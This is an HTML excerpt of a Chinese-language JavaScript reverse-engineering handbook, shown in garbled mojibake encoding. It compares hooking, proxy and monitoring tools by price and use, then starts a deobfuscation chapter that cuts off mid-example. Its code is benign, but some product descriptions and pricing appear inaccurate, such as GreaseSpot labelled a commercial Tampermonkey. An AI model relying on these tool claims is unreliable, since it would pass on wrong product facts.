        <li>ç§»åŠ¨åº”ç”¨é€†å‘</li>
        <li>Webåº”ç”¨åŠ¨æ€åˆ†æ</li>
        <li>æ¶æ„è½¯ä»¶åˆ†æ</li>
        <li>å®‰å…¨ç ”ç©¶</li>
      </ul>

      <p><strong>GitHub</strong>: https://github.com/frida/frida</p>

      <p><strong>å­¦ä¹ æˆæœ¬</strong>: ä¸­ç­‰</p>

      <p><strong>ä¼ä¸šä½¿ç”¨</strong>:</p>

      <ul>
        <li>âœ… å®Œå…¨å…è´¹</li>
        <li>âœ… æ— ä½¿ç”¨é™åˆ¶</li>
        <li>âœ… å¯å•†ä¸šåŒ–</li>
        <li>âŒ éœ€è¦æŠ€æœ¯å›¢é˜Ÿç»´æŠ¤</li>
      </ul>

      <hr />

      <h4 id="charles-proxyå•†ä¸šç½‘ç»œè°ƒè¯•å·¥å…·">Charles Proxyï¼ˆå•†ä¸šç½‘ç»œè°ƒè¯•å·¥å…·ï¼‰</h4>

      <p><strong>å®šä½</strong>: HTTP/HTTPSæŠ“åŒ…å’Œè°ƒè¯•</p>

      <p><strong>åŠŸèƒ½</strong>:</p>

      <ul>
        <li>SSLè¯ä¹¦ä¸­é—´äººæ‹¦æˆª</li>
        <li>è¯·æ±‚/å“åº”ä¿®æ”¹</li>
        <li>æ–­ç‚¹å’Œé‡æ”¾</li>
        <li>æµé‡é™é€Ÿæ¨¡æ‹Ÿ</li>
      </ul>

      <p><strong>ä»·æ ¼</strong>:</p>

      <ul>
        <li>ä¸ªäººè®¸å¯: $50ï¼ˆä¸€æ¬¡æ€§ï¼‰</li>
        <li>å•†ä¸šè®¸å¯: $100+</li>
      </ul>

      <p><strong>ä¼˜åŠ¿</strong>:</p>

      <ul>
        <li>å›¾å½¢åŒ–ç•Œé¢ï¼Œæ˜“ç”¨æ€§å¼º</li>
        <li>ç¨³å®šå¯é </li>
        <li>è·¨å¹³å°æ”¯æŒ</li>
      </ul>

      <p><strong>åŠ£åŠ¿</strong>:</p>

      <ul>
        <li>ä»…é™ç½‘ç»œå±‚Hook</li>
        <li>æ— æ³•Hook JavaScriptå‡½æ•°</li>
      </ul>

      <p><strong>å®˜ç½‘</strong>: https://www.charlesproxy.com/</p>

      <p><strong>é€‚ç”¨</strong>: ç½‘ç»œå±‚åˆ†æã€APIè°ƒè¯•</p>

      <hr />

      <h4 id="burp-suite-professional">Burp Suite Professional</h4>

      <p><strong>å®šä½</strong>: Webå®‰å…¨æµ‹è¯•ä¸“ä¸šå·¥å…·</p>

      <p><strong>æ ¸å¿ƒåŠŸèƒ½</strong>:</p>

      <ul>
        <li>HTTP/HTTPSä»£ç†æ‹¦æˆª</li>
        <li>æ‰«æå™¨ï¼ˆä¸»åŠ¨/è¢«åŠ¨ï¼‰</li>
        <li>Intruderï¼ˆè‡ªåŠ¨åŒ–æ”»å‡»ï¼‰</li>
        <li>Repeaterï¼ˆè¯·æ±‚é‡æ”¾ï¼‰</li>
        <li><strong>Burpæ‰©å±•</strong>ï¼šæ”¯æŒJavaScript Hookæ’ä»¶</li>
      </ul>

      <p><strong>ä»·æ ¼</strong>:</p>

      <ul>
        <li>Professional: $449/å¹´</li>
        <li>Enterprise: $3,999/å¹´+</li>
      </ul>

      <p><strong>JavaScript Hooké›†æˆ</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// ä½¿ç”¨ Burp Extension: JS Link</span>
<span class="c1">// å¯åœ¨Burpä¸­ç›´æ¥æ³¨å…¥Hookè„šæœ¬</span>
</code></pre>
      </div>

      <p><strong>å®˜ç½‘</strong>: https://portswigger.net/burp</p>

      <p><strong>ä¼ä¸šä¼˜åŠ¿</strong>:</p>

      <ul>
        <li>å¼ºå¤§çš„æ¼æ´æ‰«æ</li>
        <li>å®Œæ•´çš„æµ‹è¯•æŠ¥å‘Š</li>
        <li>å›¢é˜Ÿåä½œåŠŸèƒ½</li>
        <li>ä¸“ä¸šæŠ€æœ¯æ”¯æŒ</li>
      </ul>

      <hr />

      <h3 id="2-æµè§ˆå™¨è‡ªåŠ¨åŒ–hookå¹³å°">2. æµè§ˆå™¨è‡ªåŠ¨åŒ–Hookå¹³å°</h3>

      <h4 id="sauce-labs-real-device-cloud">Sauce Labs Real Device Cloud</h4>

      <p><strong>åŠŸèƒ½</strong>:</p>

      <ul>
        <li>çœŸå®è®¾å¤‡å’Œæµè§ˆå™¨äº‘æµ‹è¯•</li>
        <li>è‡ªåŠ¨åŒ–Hookè„šæœ¬æ³¨å…¥</li>
        <li>å®æ—¶äº¤äº’è°ƒè¯•</li>
        <li>è§†é¢‘å½•åˆ¶å’Œæ—¥å¿—</li>
      </ul>

      <p><strong>å®šä»·</strong>:</p>

      <ul>
        <li>Live Testing: $39/æœˆèµ·</li>
        <li>Automated Testing: $199/æœˆèµ·</li>
        <li>Enterprise: å®šåˆ¶åŒ–</li>
      </ul>

      <p><strong>é€‚ç”¨</strong>:</p>

      <ul>
        <li>è·¨æµè§ˆå™¨Hookæµ‹è¯•</li>
        <li>ç§»åŠ¨ç«¯JavaScriptè°ƒè¯•</li>
        <li>CI/CDé›†æˆ</li>
      </ul>

      <p><strong>å®˜ç½‘</strong>: https://saucelabs.com/</p>

      <hr />

      <h4 id="lambdatest">LambdaTest</h4>

      <p><strong>åŠŸèƒ½</strong>:</p>

      <ul>
        <li>3000+æµè§ˆå™¨å’Œæ“ä½œç³»ç»Ÿç»„åˆ</li>
        <li>è‡ªåŠ¨åŒ–æµ‹è¯•å’Œæ‰‹åŠ¨è°ƒè¯•</li>
        <li>é›†æˆå¼€å‘è€…å·¥å…·</li>
      </ul>

      <p><strong>å®šä»·</strong>:</p>

      <ul>
        <li>Live: $15/æœˆèµ·</li>
        <li>Automation: $99/æœˆèµ·</li>
      </ul>

      <p><strong>ç›¸æ¯”Sauce Labsæ›´ä¾¿å®œ</strong></p>

      <p><strong>å®˜ç½‘</strong>: https://www.lambdatest.com/</p>

      <hr />

      <h3 id="3-ä¼ä¸šçº§åº”ç”¨ç›‘æ§apmé›†æˆhook">3. ä¼ä¸šçº§åº”ç”¨ç›‘æ§ï¼ˆAPMï¼‰é›†æˆHook</h3>

      <h4 id="datadog-rumreal-user-monitoring">Datadog RUMï¼ˆReal User Monitoringï¼‰</h4>

      <p><strong>åŠŸèƒ½</strong>:</p>

      <ul>
        <li>å‰ç«¯æ€§èƒ½ç›‘æ§</li>
        <li>JavaScripté”™è¯¯è¿½è¸ª</li>
        <li>è‡ªå®šä¹‰Hookæ³¨å…¥</li>
        <li>ç”¨æˆ·è¡Œä¸ºåˆ†æ</li>
      </ul>

      <p><strong>æŠ€æœ¯å®ç°</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// Datadog è‡ªåŠ¨æ³¨å…¥ Hook</span>
<span class="k">import</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">datadogRum</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="kr">from</span><span class="w"> </span><span class="s1">&#39;@datadog/browser-rum&#39;</span><span class="p">;</span>

<span class="nx">datadogRum</span><span class="p">.</span><span class="nx">init</span><span class="p">({</span>
<span class="w">    </span><span class="nx">applicationId</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;&lt;YOUR_APP_ID&gt;&#39;</span><span class="p">,</span>
<span class="w">    </span><span class="nx">clientToken</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;&lt;YOUR_CLIENT_TOKEN&gt;&#39;</span><span class="p">,</span>
<span class="w">    </span><span class="c1">// è‡ªåŠ¨Hook XHR/Fetch</span>
<span class="w">    </span><span class="nx">trackInteractions</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
<span class="w">    </span><span class="nx">trackFrustrations</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span>
<span class="p">});</span>
</code></pre>
      </div>

      <p><strong>ä»·æ ¼</strong>: $0.90/1000 sessionsèµ·</p>

      <p><strong>å®˜ç½‘</strong>: https://www.datadoghq.com/</p>

      <p><strong>ä¼ä¸šä»·å€¼</strong>: ç”Ÿäº§ç¯å¢ƒHook + ç›‘æ§ä¸€ä½“åŒ–</p>

      <hr />

      <h4 id="new-relic-browser">New Relic Browser</h4>

      <p><strong>åŠŸèƒ½</strong>:</p>

      <ul>
        <li>æµè§ˆå™¨æ€§èƒ½ç›‘æ§</li>
        <li>JavaScripté”™è¯¯Hook</li>
        <li>AJAXè¯·æ±‚è‡ªåŠ¨è¿½è¸ª</li>
        <li>Session Trace</li>
      </ul>

      <p><strong>ä»·æ ¼</strong>: $75/æœˆèµ·</p>

      <p><strong>å®˜ç½‘</strong>: https://newrelic.com/</p>

      <hr />

      <h3 id="4-å•†ä¸šhookè„šæœ¬åº“å’Œå¹³å°">4. å•†ä¸šHookè„šæœ¬åº“å’Œå¹³å°</h3>

      <h4 id="greasespottampermonkeyå•†ä¸šç‰ˆ">GreaseSpotï¼ˆTampermonkeyå•†ä¸šç‰ˆï¼‰</h4>

      <p><strong>ç±»å‹</strong>: ç”¨æˆ·è„šæœ¬ç®¡ç†å™¨ï¼ˆå…è´¹+å•†ä¸šæ”¯æŒï¼‰</p>

      <p><strong>ä¼ä¸šåŠŸèƒ½</strong>:</p>

      <ul>
        <li>è„šæœ¬ç­¾åå’Œå®‰å…¨å®¡è®¡</li>
        <li>ä¼ä¸šè„šæœ¬åº“ç®¡ç†</li>
        <li>éƒ¨ç½²è‡ªåŠ¨åŒ–</li>
      </ul>

      <p><strong>ä»·æ ¼</strong>:</p>

      <ul>
        <li>ä¸ªäººå…è´¹</li>
        <li>ä¼ä¸šæ”¯æŒ: å®šåˆ¶åŒ–å®šä»·</li>
      </ul>

      <p><strong>å®˜ç½‘</strong>: https://www.greasespot.net/</p>

      <hr />

      <h4 id="requestlyä¼ä¸šçº§è¯·æ±‚ä¿®æ”¹">Requestlyï¼ˆä¼ä¸šçº§è¯·æ±‚ä¿®æ”¹ï¼‰</h4>

      <p><strong>åŠŸèƒ½</strong>:</p>

      <ul>
        <li>HTTPè¯·æ±‚æ‹¦æˆªå’Œä¿®æ”¹</li>
        <li>JavaScriptæ³¨å…¥</li>
        <li>Headerä¿®æ”¹</li>
        <li>Mock API</li>
      </ul>

      <p><strong>å®šä»·</strong>:</p>

      <ul>
        <li>Free: åŸºç¡€åŠŸèƒ½</li>
        <li>Professional: $12/æœˆ</li>
        <li>Team: $25/æœˆ/ç”¨æˆ·</li>
        <li>Enterprise: å®šåˆ¶åŒ–</li>
      </ul>

      <p><strong>ç‹¬ç‰¹ä¼˜åŠ¿</strong>:</p>

      <ul>
        <li>äº‘ç«¯è§„åˆ™åŒæ­¥</li>
        <li>å›¢é˜Ÿåä½œ</li>
        <li>è§„åˆ™å¸‚åœº</li>
      </ul>

      <p><strong>å®˜ç½‘</strong>: https://requestly.io/</p>

      <hr />

      <h3 id="5-åŠ¨æ€åˆ†æå³æœåŠ¡daas">5. åŠ¨æ€åˆ†æå³æœåŠ¡ï¼ˆDaaSï¼‰</h3>

      <h4 id="zimperium-zscanç§»åŠ¨åº”ç”¨å®‰å…¨">Zimperium zScanï¼ˆç§»åŠ¨åº”ç”¨å®‰å…¨ï¼‰</h4>

      <p><strong>åŠŸèƒ½</strong>:</p>

      <ul>
        <li>è‡ªåŠ¨åŒ–JavaScript Hook</li>
        <li>è¿è¡Œæ—¶å¨èƒæ£€æµ‹</li>
        <li>APIå®‰å…¨åˆ†æ</li>
        <li>è¡Œä¸ºåˆ†æ</li>
      </ul>

      <p><strong>é€‚ç”¨</strong>: iOS/Androidåº”ç”¨å®‰å…¨æµ‹è¯•</p>

      <p><strong>ä»·æ ¼</strong>: ä¼ä¸šå®šä»·ï¼ˆ$10,000+/å¹´ï¼‰</p>

      <p><strong>å®˜ç½‘</strong>: https://www.zimperium.com/</p>

      <hr />

      <h3 id="6-æˆæœ¬æ•ˆç›Šå¯¹æ¯”">6. æˆæœ¬æ•ˆç›Šå¯¹æ¯”</h3>

      <h4 id="åœºæ™¯1-ä¸ªäººå­¦ä¹ ç ”ç©¶">åœºæ™¯1: ä¸ªäººå­¦ä¹ /ç ”ç©¶</h4>

      <p><strong>æ¨èæ–¹æ¡ˆ</strong>:</p>

      <ul>
        <li>Chrome DevToolsï¼ˆå…è´¹ï¼‰</li>
        <li>æ‰‹å†™Hookè„šæœ¬</li>
        <li>Tampermonkeyï¼ˆå…è´¹ï¼‰</li>
      </ul>

      <p><strong>æ€»æˆæœ¬</strong>: <strong>$0</strong></p>

      <hr />

      <h4 id="åœºæ™¯2-å°å›¢é˜Ÿwebé€†å‘é¡¹ç›®">åœºæ™¯2: å°å›¢é˜ŸWebé€†å‘é¡¹ç›®</h4>

      <p><strong>æ¨èæ–¹æ¡ˆ</strong>:</p>

      <ul>
        <li>Burp Suite Professionalï¼ˆ$449/å¹´ï¼‰</li>
        <li>Charles Proxyï¼ˆ$50ä¸€æ¬¡æ€§ï¼‰</li>
        <li>è‡ªå®šä¹‰Hookè„šæœ¬åº“</li>
      </ul>

      <p><strong>æ€»æˆæœ¬</strong>: <strong>~$500ç¬¬ä¸€å¹´ï¼Œ$449åç»­/å¹´</strong></p>

      <p><strong>ROI</strong>: ä¸“ä¸šå·¥å…·èŠ‚çœæ—¶é—´ï¼Œæé«˜æ•ˆç‡</p>

      <hr />

      <h4 id="åœºæ™¯3-ä¼ä¸šå®‰å…¨å›¢é˜Ÿ">åœºæ™¯3: ä¼ä¸šå®‰å…¨å›¢é˜Ÿ</h4>

      <p><strong>æ¨èæ–¹æ¡ˆ</strong>:</p>

      <ul>
        <li>Burp Suite Enterpriseï¼ˆ$3,999/å¹´ï¼‰</li>
        <li>Datadog RUMï¼ˆ$1,000+/æœˆï¼Œç”Ÿäº§ç›‘æ§ï¼‰</li>
        <li>ä¸“ä¸šå’¨è¯¢æœåŠ¡ï¼ˆæŒ‰éœ€ï¼‰</li>
      </ul>

      <p><strong>æ€»æˆæœ¬</strong>: <strong>$15,000-50,000/å¹´</strong></p>

      <p><strong>ä¼ä¸šä»·å€¼</strong>:</p>

      <ul>
        <li>åˆè§„å®¡è®¡æŠ¥å‘Š</li>
        <li>24/7æŠ€æœ¯æ”¯æŒ</li>
        <li>å›¢é˜Ÿåä½œåŠŸèƒ½</li>
        <li>ç”Ÿäº§ç¯å¢ƒç›‘æ§</li>
      </ul>

      <hr />

      <h3 id="7-å¼€æº-vs-å•†ä¸šå†³ç­–çŸ©é˜µ">7. å¼€æº vs å•†ä¸šå†³ç­–çŸ©é˜µ</h3>

      <table>
        <thead>
          <tr>
            <th>å› ç´ </th>
            <th>æ¨èå¼€æº</th>
            <th>æ¨èå•†ä¸š</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>é¢„ç®—</strong></td>
            <td>&lt; $1,000/å¹´</td>
            <td>&gt; $5,000/å¹´</td>
          </tr>
          <tr>
            <td><strong>å›¢é˜Ÿè§„æ¨¡</strong></td>
            <td>&lt; 3äºº</td>
            <td>&gt; 5äºº</td>
          </tr>
          <tr>
            <td><strong>é¡¹ç›®ç±»å‹</strong></td>
            <td>ä¸€æ¬¡æ€§é€†å‘</td>
            <td>æŒç»­å®‰å…¨æµ‹è¯•</td>
          </tr>
          <tr>
            <td><strong>æŠ€æœ¯èƒ½åŠ›</strong></td>
            <td>é«˜ï¼ˆèƒ½è‡ªå·±å†™è„šæœ¬ï¼‰</td>
            <td>ä¸­ä½ï¼ˆéœ€è¦GUIå·¥å…·ï¼‰</td>
          </tr>
          <tr>
            <td><strong>åˆè§„è¦æ±‚</strong></td>
            <td>æ— </td>
            <td>éœ€è¦å®¡è®¡æŠ¥å‘Š</td>
          </tr>
          <tr>
            <td><strong>æ”¯æŒéœ€æ±‚</strong></td>
            <td>ç¤¾åŒºå°±å¤Ÿ</td>
            <td>éœ€è¦å•†ä¸šæ”¯æŒ</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h3 id="8-äº‘ç«¯hookæœåŠ¡æ–°å…´">8. äº‘ç«¯HookæœåŠ¡ï¼ˆæ–°å…´ï¼‰</h3>

      <h4 id="browserlessio-hook-support">Browserless.io Hook Support</h4>

      <p><strong>åŠŸèƒ½</strong>:</p>

      <ul>
        <li>äº‘ç«¯æµè§ˆå™¨Hookæ³¨å…¥</li>
        <li>æ— éœ€æœ¬åœ°ç¯å¢ƒ</li>
        <li>APIè°ƒç”¨æ–¹å¼</li>
      </ul>

      <p><strong>ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;https://chrome.browserless.io/function&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;POST&#39;</span><span class="p">,</span>
<span class="w">    </span><span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;application/json&#39;</span><span class="w"> </span><span class="p">},</span>
<span class="w">    </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
<span class="w">        </span><span class="nx">code</span><span class="o">:</span><span class="w"> </span><span class="sb">`</span>
<span class="sb">            // Hookä»£ç </span>
<span class="sb">            const original = XMLHttpRequest.prototype.send;</span>
<span class="sb">            XMLHttpRequest.prototype.send = function(...args) {</span>
<span class="sb">                console.log(&#39;Hooked:&#39;, args);</span>
<span class="sb">                return original.apply(this, args);</span>
<span class="sb">            };</span>
<span class="sb">        `</span><span class="p">,</span>
<span class="w">        </span><span class="nx">context</span><span class="o">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">url</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;https://example.com&#39;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">})</span>
<span class="p">});</span>
</code></pre>
      </div>

      <p><strong>ä»·æ ¼</strong>: $29-299/æœˆï¼ˆè§automation_scripts.mdï¼‰</p>

      <hr />

      <h3 id="9-aiè¾…åŠ©hookå¼€å‘">9. AIè¾…åŠ©Hookå¼€å‘</h3>

      <h4 id="github-copilot-for-security">GitHub Copilot for Security</h4>

      <p><strong>åŠŸèƒ½</strong>:</p>

      <ul>
        <li>è‡ªåŠ¨ç”ŸæˆHookè„šæœ¬</li>
        <li>å®‰å…¨æ¼æ´æ£€æµ‹</li>
        <li>ä»£ç è¡¥å…¨</li>
      </ul>

      <p><strong>ä»·æ ¼</strong>: $100/å¹´ï¼ˆä¸ªäººï¼‰</p>

      <p><strong>ç¤ºä¾‹Prompt</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// Prompt: Write a hook for XMLHttpRequest that logs all requests</span>
<span class="c1">// Copilot è‡ªåŠ¨ç”Ÿæˆå®Œæ•´Hookä»£ç </span>
</code></pre>
      </div>

      <hr />

      <h4 id="chatgptclaudeè¾…åŠ©">ChatGPT/Claudeè¾…åŠ©</h4>

      <p><strong>åº”ç”¨</strong>:</p>

      <ul>
        <li>è§£é‡Šå¤æ‚Hooké€»è¾‘</li>
        <li>ç”Ÿæˆå®šåˆ¶åŒ–Hookè„šæœ¬</li>
        <li>è°ƒè¯•Hookä»£ç </li>
      </ul>

      <p><strong>æˆæœ¬</strong>: $20/æœˆï¼ˆChatGPT Plusï¼‰æˆ–æŒ‰éœ€APIè°ƒç”¨</p>

      <hr />

      <h3 id="10-å®æˆ˜å·¥å…·é“¾æ¨è">10. å®æˆ˜å·¥å…·é“¾æ¨è</h3>

      <h4 id="åˆå­¦è€…0æˆæœ¬">åˆå­¦è€…ï¼ˆ$0æˆæœ¬ï¼‰</h4>

      <p><strong>å·¥å…·ç»„åˆ</strong>:</p>

      <ol>
        <li>Chrome DevToolsï¼ˆå…è´¹ï¼‰</li>
        <li>Tampermonkeyï¼ˆå…è´¹ï¼‰</li>
        <li>æœ¬æ–‡æ¡£çš„Hookè„šæœ¬åº“</li>
      </ol>

      <p><strong>èƒ½åŠ›</strong>:</p>

      <ul>
        <li>åŸºç¡€Hook</li>
        <li>ç½‘ç»œè¯·æ±‚ç›‘æ§</li>
        <li>Cookie/Storageæ“ä½œ</li>
      </ul>

      <hr />

      <h4 id="ä¸“ä¸šäººå£«-1000å¹´">ä¸“ä¸šäººå£«ï¼ˆ&lt; $1,000/å¹´ï¼‰</h4>

      <p><strong>å·¥å…·ç»„åˆ</strong>:</p>

      <ol>
        <li>Burp Suite Professionalï¼ˆ$449/å¹´ï¼‰</li>
        <li>Charles Proxyï¼ˆ$50ä¸€æ¬¡æ€§ï¼‰</li>
        <li>GitHub Copilotï¼ˆ$100/å¹´ï¼‰</li>
        <li>Requestly Proï¼ˆ$144/å¹´ï¼‰</li>
      </ol>

      <p><strong>æ€»æˆæœ¬</strong>: <strong>~$750/å¹´</strong></p>

      <p><strong>èƒ½åŠ›æå‡</strong>:</p>

      <ul>
        <li>ä¼ä¸šçº§æ‹¦æˆªå’Œä¿®æ”¹</li>
        <li>è‡ªåŠ¨åŒ–Hookç”Ÿæˆ</li>
        <li>å›¢é˜Ÿåä½œ</li>
      </ul>

      <hr />

      <h4 id="ä¼ä¸šå›¢é˜Ÿ10000å¹´">ä¼ä¸šå›¢é˜Ÿï¼ˆ$10,000+/å¹´ï¼‰</h4>

      <p><strong>å·¥å…·ç»„åˆ</strong>:</p>

      <ol>
        <li>Burp Suite Enterpriseï¼ˆ$3,999/å¹´ï¼‰</li>
        <li>Datadog RUMï¼ˆ$12,000/å¹´ï¼‰</li>
        <li>ä¸“ä¸šåŸ¹è®­å’Œå’¨è¯¢ï¼ˆæŒ‰éœ€ï¼‰</li>
        <li>è‡ªå»ºHookå¹³å°ï¼ˆå¼€å‘æˆæœ¬ï¼‰</li>
      </ol>

      <p><strong>ROIåˆ†æ</strong>:</p>

      <ul>
        <li>å‡å°‘äººå·¥åˆ†ææ—¶é—´ 60%+</li>
        <li>æä¾›å®¡è®¡æŠ¥å‘Š</li>
        <li>ç”Ÿäº§ç¯å¢ƒå®æ—¶ç›‘æ§</li>
        <li>é™ä½å®‰å…¨é£é™©</li>
      </ul>

      <hr />

      <h3 id="11-è¡Œä¸šæ¡ˆä¾‹å‚è€ƒ">11. è¡Œä¸šæ¡ˆä¾‹å‚è€ƒ</h3>

      <h4 id="é‡‘èè¡Œä¸šé«˜åˆè§„è¦æ±‚">é‡‘èè¡Œä¸šï¼ˆé«˜åˆè§„è¦æ±‚ï¼‰</h4>

      <p><strong>æ–¹æ¡ˆ</strong>:</p>

      <ul>
        <li>Burp Suite Enterprise</li>
        <li>Datadog APM</li>
        <li>å†…éƒ¨å®¡è®¡ç³»ç»Ÿé›†æˆ</li>
      </ul>

      <p><strong>æˆæœ¬</strong>: $50,000/å¹´</p>

      <p><strong>æ”¶ç›Š</strong>: æ»¡è¶³PCI DSSåˆè§„è¦æ±‚</p>

      <hr />

      <h4 id="å®‰å…¨å…¬å¸ä¸“ä¸šæœåŠ¡">å®‰å…¨å…¬å¸ï¼ˆä¸“ä¸šæœåŠ¡ï¼‰</h4>

      <p><strong>æ–¹æ¡ˆ</strong>:</p>

      <ul>
        <li>Burp Suite + Frida</li>
        <li>è‡ªç ”Hookæ¡†æ¶</li>
        <li>å¤šè¯­è¨€æ”¯æŒ</li>
      </ul>

      <p><strong>æˆæœ¬</strong>: $5,000/å¹´ï¼ˆå·¥å…·ï¼‰+ å¼€å‘æˆæœ¬</p>

      <p><strong>æ”¶ç›Š</strong>: å¯å¯¹å¤–æä¾›ä¸“ä¸šæœåŠ¡</p>

      <hr />

      <h4 id="ç”µå•†å¹³å°ä¸šåŠ¡ç›‘æ§">ç”µå•†å¹³å°ï¼ˆä¸šåŠ¡ç›‘æ§ï¼‰</h4>

      <p><strong>æ–¹æ¡ˆ</strong>:</p>

      <ul>
        <li>New Relic Browser</li>
        <li>è‡ªå®šä¹‰Hookç›‘æ§å…³é”®ä¸šåŠ¡æµç¨‹</li>
      </ul>

      <p><strong>æˆæœ¬</strong>: $15,000/å¹´</p>

      <p><strong>æ”¶ç›Š</strong>: æå‡ç”¨æˆ·ä½“éªŒï¼Œé™ä½æµå¤±ç‡</p>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#03-Basic-Recipes-debugging-techniques">è°ƒè¯•æŠ€å·§ä¸æ–­ç‚¹è®¾ç½®</a></li>
        <li><a href="#04-Advanced-Recipes-javascript-deobfuscation">JavaScript åæ··æ·†</a></li>
        <li><a href="#02-Tooling-browser-devtools">æµè§ˆå™¨å¼€å‘è€…å·¥å…·</a></li>
        <li><a href="#07-Scripts-crypto-detection-scripts">åŠ å¯†ç®—æ³•è¯†åˆ«è„šæœ¬</a></li>
        <li><a href="#07-Scripts-automation-scripts">æµè§ˆå™¨è‡ªåŠ¨åŒ–è„šæœ¬</a></li>
      </ul>

    </div>

    <div class="section" id="07-Scripts-deobfuscation-scripts">
      <h2>59. Deobfuscation Scripts</h2>
      <h1 id="åæ··æ·†è„šæœ¬">åæ··æ·†è„šæœ¬</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>JavaScript æ··æ·†æ˜¯ä¿æŠ¤ä»£ç é€»è¾‘çš„å¸¸ç”¨æ‰‹æ®µã€‚æœ¬ç« æä¾›å¸¸ç”¨çš„åæ··æ·†è„šæœ¬å’ŒæŠ€æœ¯ï¼Œå¸®åŠ©è¿˜åŸæ··æ·†åçš„ä»£ç ã€‚</p>

      <hr />

      <h2 id="æ··æ·†ç±»å‹è¯†åˆ«">æ··æ·†ç±»å‹è¯†åˆ«</h2>

      <h3 id="1-å˜é‡åæ··æ·†">1. å˜é‡åæ··æ·†</h3>

      <p><strong>ç‰¹å¾</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">var</span><span class="w"> </span><span class="nx">_0x1a2b</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Hello&#39;</span><span class="p">;</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">_0x3c4d</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;World&#39;</span><span class="p">;</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">_0x1a2b</span><span class="p">,</span><span class="w"> </span><span class="nx">_0x3c4d</span><span class="p">);</span>
</code></pre>
      </div>

      <p><strong>å·¥å…·</strong>: Prettier æ ¼å¼åŒ–åæ‰‹åŠ¨é‡å‘½å</p>

      <h3 id="2-å­—ç¬¦ä¸²æ•°ç»„æ··æ·†">2. å­—ç¬¦ä¸²æ•°ç»„æ··æ·†</h3>

      <p><strong>ç‰¹å¾</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">var</span><span class="w"> </span><span class="nx">_0x1234</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s1">&#39;Hello&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;World&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;console&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;log&#39;</span><span class="p">];</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">_0xa</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_0x1234</span><span class="p">[</span><span class="mf">0</span><span class="p">];</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">_0xb</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_0x1234</span><span class="p">[</span><span class="mf">1</span><span class="p">];</span>
<span class="nb">window</span><span class="p">[</span><span class="nx">_0x1234</span><span class="p">[</span><span class="mf">2</span><span class="p">]][</span><span class="nx">_0x1234</span><span class="p">[</span><span class="mf">3</span><span class="p">]](</span><span class="nx">_0xa</span><span class="p">,</span><span class="w"> </span><span class="nx">_0xb</span><span class="p">);</span>
</code></pre>
      </div>

      <p><strong>è„šæœ¬</strong>: è§ä¸‹æ–¹å­—ç¬¦ä¸²æ•°ç»„è¿˜åŸè„šæœ¬</p>

      <h3 id="3-æ§åˆ¶æµå¹³å¦åŒ–">3. æ§åˆ¶æµå¹³å¦åŒ–</h3>

      <p><strong>ç‰¹å¾</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">var</span><span class="w"> </span><span class="nx">_0x1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="k">while</span><span class="p">(</span><span class="kc">true</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">switch</span><span class="p">(</span><span class="nx">_0x1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mf">0</span><span class="o">:</span><span class="w"> </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;A&#39;</span><span class="p">);</span><span class="w"> </span><span class="nx">_0x1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1</span><span class="p">;</span><span class="w"> </span><span class="k">break</span><span class="p">;</span>
